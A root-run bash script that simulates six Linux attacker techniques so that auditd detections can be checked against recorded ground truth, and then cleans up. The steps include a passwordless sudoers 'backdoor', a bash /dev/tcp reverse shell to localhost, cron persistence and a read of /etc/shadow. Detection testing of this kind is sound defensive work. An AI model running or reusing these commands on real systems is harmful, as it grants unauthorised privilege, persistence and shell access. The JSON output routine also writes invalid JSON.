#!/bin/bash

# name: 11-linux_attack_sim.sh
# purpose: Run a Linux attacker simulation and record ground truth
# author: Tristeceratops

set -euo pipefail

if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

echo "[*] Running Linux attacker simulation..."

LOG_FILE="linux_attack_log.json"
EVENTS_FILE="/tmp/linux_attack_events"

: > "$EVENTS_FILE"

run_step() {
    local step_num="$1"
    local desc="$2"
    local technique="$3"
    local expected="$4"
    local ts

    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

    printf "    [%s] %-45s %s\n" "$step_num" "$desc" "$ts"

    printf '%s|%s|%s|%s|%s\n' \
        "$step_num" "$desc" "$ts" "$technique" "$expected" >> "$EVENTS_FILE"
}

# 1. Create user
run_step "1/6" "Creating user testattacker..." \
    "T1136.001" "auditd_USER_ACCT"

useradd testattacker 2>/dev/null || true

# 2. Modify sudoers
run_step "2/6" "Modifying sudoers..." \
    "T1548.003" "auditd_PATH_SYSCALL"

echo "testattacker ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/backdoor

# 3. Execute binary from /tmp
run_step "3/6" "Executing from /tmp..." \
    "T1059" "auditd_execve"

cp /usr/bin/id /tmp/suspicious_bin
/tmp/suspicious_bin >/dev/null 2>&1 || true

# 4. Reverse shell attempt
run_step "4/6" "Reverse shell attempt (localhost)..." \
    "T1059.004" "auditd_network"

bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' \
    2>/dev/null &
pid=$!

sleep 1
kill "$pid" 2>/dev/null || true

# 5. Cron persistence
run_step "5/6" "Cron persistence..." \
    "T1053.003" "auditd_PATH_SYSCALL"

echo "* * * * * /tmp/beacon.sh" > /etc/cron.d/persistence_test

# 6. Access /etc/shadow
run_step "6/6" "Accessing /etc/shadow..." \
    "T1552.001" "auditd_PATH_SYSCALL"

cat /etc/shadow >/dev/null 2>&1 || true

# Create ground-truth JSON before cleanup.
{
    echo '{'
    echo '  "events": ['

    first=true

    while IFS='|' read -r action description timestamp technique expected; do
        if [ "$first" = false ]; then
            echo "    ,"
        fi
        first=false

        printf '    {"action":%s,"description":"%s","timestamp":"%s","technique":"%s","MITRE":"%s","expected":"%s"}' \
            "$action" \
            "$description" \
            "$timestamp" \
            "$technique" \
            "$technique" \
            "$expected"
    done < "$EVENTS_FILE"

    echo
    echo '  ]'
    echo '}'
} > "$LOG_FILE"

# Clean up artifacts.
echo -n "[*] Cleaning up artifacts..."

userdel -r testattacker 2>/dev/null || true
rm -f /etc/sudoers.d/backdoor
rm -f /tmp/suspicious_bin
rm -f /etc/cron.d/persistence_test
rm -f /tmp/beacon.sh
rm -f "$EVENTS_FILE"

echo "                           [CLEAN]"

echo "Actions executed: 6"
echo "Ground truth saved to: $LOG_FILE"
